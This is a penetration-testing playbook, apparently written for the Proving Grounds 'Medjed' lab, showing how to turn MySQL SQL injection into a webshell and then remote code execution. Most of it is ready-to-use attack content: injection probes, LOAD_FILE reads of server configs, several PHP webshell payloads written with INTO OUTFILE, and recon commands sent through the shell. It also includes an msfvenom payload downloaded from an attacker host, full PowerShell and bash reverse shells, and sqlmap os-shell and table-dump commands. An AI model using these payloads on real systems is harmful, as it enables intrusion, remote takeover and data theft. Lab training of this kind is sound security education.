# MySQL SQLi → Webshell → RCE Playbook

Focused reference for exploiting SQL injection to write a webshell and get code execution, based on the Medjed (Proving Grounds) chain. The technique works anytime you have:

1. A SQL injection against **MySQL/MariaDB**
2. The DB user has **FILE privilege** (root/admin usually does)
3. You know the **web root path** of a PHP/ASP server on the same host
4. The web root is **writable** by the MySQL process

```
SQLi on App A ──INTO OUTFILE──→ webshell on App B ──?cmd=──→ RCE
(port 33033)                    (port 45332)
```

---

## Phase 1 — Spot the Injection

### What to look for

Any user input reflected in a database query. Common giveaways:

```
# Error-based clues in the response
Mysql2::Error           ← Ruby/Rails + MySQL (Medjed case)
You have an error in your SQL syntax
mysql_fetch_array()
PG::SyntaxError         ← PostgreSQL
SQLite3::SQLException
ODBC SQL Server Driver
unclosed quotation mark
```

### The single-quote test

Submit a `'` (single quote) in every input field, URL parameter, header, and cookie. If the app returns a SQL error, you have injection.

```bash
# In a URL parameter
curl "http://TARGET:33033/slug?URL='"

# In a form field
curl -X POST "http://TARGET:33033/slug" -d "URL='"
```

**Medjed case:** The `/slug` endpoint on port 33033 took a URL parameter and dropped it straight into:
```sql
SELECT username FROM users WHERE username = '<OUR_INPUT>'
```

A single `'` broke the query and the verbose Rails error page printed the full SQL statement — textbook error-based SQLi confirmation.

### Quick injection probes

```
'               → SQL error = injectable
' OR '1'='1    → returns data / changes behavior = injectable
' OR '1'='2    → normal behavior = confirms boolean-based
' UNION SELECT NULL-- -  → test column count
```

---

## Phase 2 — Find the Web Root

Before writing a file, you need to know **where** to write it. Common discovery methods:

### phpinfo.php

```bash
# Gobuster/ffuf to find it
gobuster dir -u http://TARGET:45332 -w /usr/share/wordlists/dirb/common.txt

# Read the DOCUMENT_ROOT
curl -s http://TARGET:45332/phpinfo.php | grep -i 'DOCUMENT_ROOT'
# Output: C:/xampp/htdocs
```

### Common web roots by stack

| Stack | Typical Path |
|-------|-------------|
| XAMPP (Windows) | `C:/xampp/htdocs` |
| WAMP | `C:/wamp/www` or `C:/wamp64/www` |
| IIS default | `C:/inetpub/wwwroot` |
| Apache (Linux) | `/var/www/html` |
| Nginx (Linux) | `/usr/share/nginx/html` or `/var/www/html` |
| LAMP custom | `/var/www/<vhost>` |

### Via SQLi itself (if you don't have phpinfo)

```sql
-- MySQL: read the Apache config to find DocumentRoot
' UNION SELECT LOAD_FILE('C:/xampp/apache/conf/httpd.conf')-- -
' UNION SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf')-- -
' UNION SELECT LOAD_FILE('/etc/nginx/sites-enabled/default')-- -

-- MySQL: check common paths exist
' UNION SELECT LOAD_FILE('C:/xampp/htdocs/index.html')-- -
```

---

## Phase 3 — Determine Column Count

`UNION SELECT` requires matching the number of columns in the original query. Find it by incrementing NULLs:

```sql
' UNION SELECT NULL-- -                    → error (wrong count)
' UNION SELECT NULL,NULL-- -               → error
' UNION SELECT NULL,NULL,NULL-- -          → success = 3 columns
```

Or use `ORDER BY`:

```sql
' ORDER BY 1-- -    → OK
' ORDER BY 2-- -    → OK
' ORDER BY 3-- -    → error = 2 columns
```

**Medjed case:** The query was `SELECT username FROM users WHERE username = '...'` — only 1 column, so `UNION SELECT (payload)` worked directly.

---

## Phase 4 — Write the Webshell

### The INTO OUTFILE payload

```sql
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php' -- -'
```

**Breaking it down:**

| Part | Purpose |
|------|---------|
| `'` | Close the original string in the WHERE clause |
| `UNION SELECT (...)` | Inject our content as the query result |
| `<?php echo passthru($_GET['cmd']);` | PHP webshell — runs any command from `?cmd=` |
| `INTO OUTFILE 'path'` | MySQL writes the query result to a file on disk |
| `-- -'` | Comment out the rest of the original query |

### URL-encoded version (for browser/curl)

```
http://TARGET:33033/slug?URL=%27+UNION+SELECT+%28%22%3C%3Fphp+echo+passthru%28%24_GET%5B%27cmd%27%5D%29%3B%22%29+INTO+OUTFILE+%27C%3A%2Fxampp%2Fhtdocs%2Fcmd.php%27++--+-%27
```

### With curl

```bash
# Write the webshell
curl -G "http://TARGET:33033/slug" \
  --data-urlencode "URL=' UNION SELECT (\"<?php echo passthru(\$_GET['cmd']);\") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'"
```

**Note:** `--data-urlencode` handles the encoding for you — much safer than manual encoding.

### Alternative webshell payloads

```sql
-- Minimal (system)
' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/sh.php'-- -

-- Shell_exec (returns output as string)
' UNION SELECT '<?php echo shell_exec($_GET["c"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/sh.php'-- -

-- POST-based (harder to detect in logs)
' UNION SELECT '<?php system($_POST["c"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/sh.php'-- -

-- Password-protected
' UNION SELECT '<?php if($_GET["k"]==="s3cr3t"){system($_GET["c"]);} ?>' INTO OUTFILE 'C:/xampp/htdocs/sh.php'-- -

-- Multi-column (if UNION needs more columns)
' UNION SELECT '<?php system($_GET["c"]); ?>',NULL,NULL INTO OUTFILE 'C:/xampp/htdocs/sh.php'-- -
```

### Linux paths

```sql
' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'-- -
```

---

## Phase 5 — Verify and Use the Webshell

### Test it

```bash
# Windows
curl "http://TARGET:45332/cmd.php?cmd=whoami"
# Expected: medjed\jerren (or whatever the Apache service user is)

curl "http://TARGET:45332/cmd.php?cmd=dir"

# Linux
curl "http://TARGET/cmd.php?cmd=id"
curl "http://TARGET/cmd.php?cmd=ls+-la"
```

### Useful recon commands through the webshell

```bash
# Windows
curl "http://TARGET:45332/cmd.php?cmd=whoami+/priv"
curl "http://TARGET:45332/cmd.php?cmd=systeminfo"
curl "http://TARGET:45332/cmd.php?cmd=net+user"
curl "http://TARGET:45332/cmd.php?cmd=ipconfig+/all"
curl "http://TARGET:45332/cmd.php?cmd=dir+C:\Users"
curl "http://TARGET:45332/cmd.php?cmd=type+C:\Users\Administrator\Desktop\proof.txt"

# Linux
curl "http://TARGET/cmd.php?cmd=id;cat+/etc/passwd"
curl "http://TARGET/cmd.php?cmd=find+/+-name+user.txt+2>/dev/null"
```

---

## Phase 6 — Upgrade to a Real Shell

A webshell is limited (no interactivity, no job control). Upgrade to a proper reverse shell:

### Method 1 — Download + execute a payload

```bash
# Generate payload on attacker
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o rev.exe

# Host it
python3 -m http.server 8080

# Download via webshell (URL-encode the spaces with +)
curl "http://TARGET:45332/cmd.php?cmd=certutil+-f+-urlcache+http://ATTACKER:8080/rev.exe+C:\Windows\Temp\rev.exe"

# Start listener
nc -lvnp 4444

# Execute via webshell
curl "http://TARGET:45332/cmd.php?cmd=C:\Windows\Temp\rev.exe"
```

### Method 2 — PowerShell one-liner (no file on disk)

```bash
# URL-encode this and send via cmd.php:
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

With curl (use `--data-urlencode` for the complex string):

```bash
nc -lvnp 4444 &
curl -G "http://TARGET:45332/cmd.php" \
  --data-urlencode "cmd=powershell -nop -c \"\$c=New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$r2=\$r+'PS '+(pwd).Path+'> ';\$sb=([text.encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close()\""
```

### Method 3 — Linux reverse shell via webshell

```bash
curl "http://TARGET/cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
```

---

## Using sqlmap Instead

`sqlmap` can automate the entire chain — from injection discovery to webshell deployment:

### Discover the injection

```bash
# GET parameter
sqlmap -u "http://TARGET:33033/slug?URL=test" -p URL --batch

# If the app needs authentication (cookies)
sqlmap -u "http://TARGET:33033/slug?URL=test" -p URL \
  --cookie="_session_id=abc123" --batch
```

### Write a webshell with sqlmap

```bash
# --os-shell (sqlmap handles everything)
sqlmap -u "http://TARGET:33033/slug?URL=test" -p URL \
  --cookie="_session_id=abc123" \
  --os-shell --batch

# Manual file write
sqlmap -u "http://TARGET:33033/slug?URL=test" -p URL \
  --cookie="_session_id=abc123" \
  --file-write="./cmd.php" --file-dest="C:/xampp/htdocs/cmd.php" --batch
```

Create a local `cmd.php` first:
```bash
echo '<?php system($_GET["cmd"]); ?>' > cmd.php
```

### Dump data first (if you want creds before going for RCE)

```bash
# List databases
sqlmap -u "http://TARGET:33033/slug?URL=test" -p URL --cookie="..." --dbs

# Dump users table
sqlmap -u "http://TARGET:33033/slug?URL=test" -p URL --cookie="..." \
  -D app_db -T users --dump
```

---

## Troubleshooting

**"The MySQL server is running with the --secure-file-priv option"**
MySQL is configured to restrict file writes to a specific directory (or disable them entirely). Check with:
```sql
' UNION SELECT @@secure_file_priv-- -
```
If it returns a path, you can only write there. If it's NULL, `INTO OUTFILE` is completely disabled. If it's empty string, you can write anywhere.

**"Access denied for user... (using password: YES)"**
The DB user lacks `FILE` privilege. Only `root` or users explicitly granted `FILE` can use `INTO OUTFILE` / `LOAD_FILE()`.

**"Can't create/write to file"**
The MySQL process doesn't have OS-level write permission to the target directory, or the file already exists (MySQL won't overwrite with `INTO OUTFILE`). Try a different filename.

**Webshell written but returns 404/403**
The web server and MySQL are writing to different root directories, or the web server doesn't have `.php` handler configured. Double-check the `DOCUMENT_ROOT` from `phpinfo()`.

**The app uses GET but sqlmap needs POST (or vice versa)**
```bash
# POST form
sqlmap -u "http://TARGET:33033/slug" --data="URL=test" -p URL

# With specific request method
sqlmap -u "http://TARGET:33033/slug?URL=test" --method=GET
```

---

## Quick Reference

```
┌───────────────────────────────────────────────────────────────────┐
│  DETECT       Submit ' in every field/param                       │
│               Look for SQL errors in response                     │
│                                                                   │
│  COLUMN COUNT ' ORDER BY 1-- -  (increment until error)           │
│               ' UNION SELECT NULL,NULL,...-- -                     │
│                                                                   │
│  FIND ROOT    phpinfo.php → DOCUMENT_ROOT                         │
│               LOAD_FILE('/etc/apache2/sites-enabled/default')     │
│               Common: C:/xampp/htdocs, /var/www/html              │
│                                                                   │
│  WRITE SHELL  ' UNION SELECT '<?php system($_GET["c"]); ?>'       │
│                 INTO OUTFILE '/path/cmd.php'-- -                   │
│                                                                   │
│  USE SHELL    curl "http://TARGET/cmd.php?cmd=whoami"             │
│                                                                   │
│  UPGRADE      certutil download rev.exe + execute                  │
│               powershell one-liner reverse shell                   │
│               bash /dev/tcp reverse (Linux)                       │
│                                                                   │
│  SQLMAP       sqlmap -u URL -p PARAM --os-shell                   │
│               sqlmap ... --file-write=sh.php --file-dest=/path/   │
└───────────────────────────────────────────────────────────────────┘
```
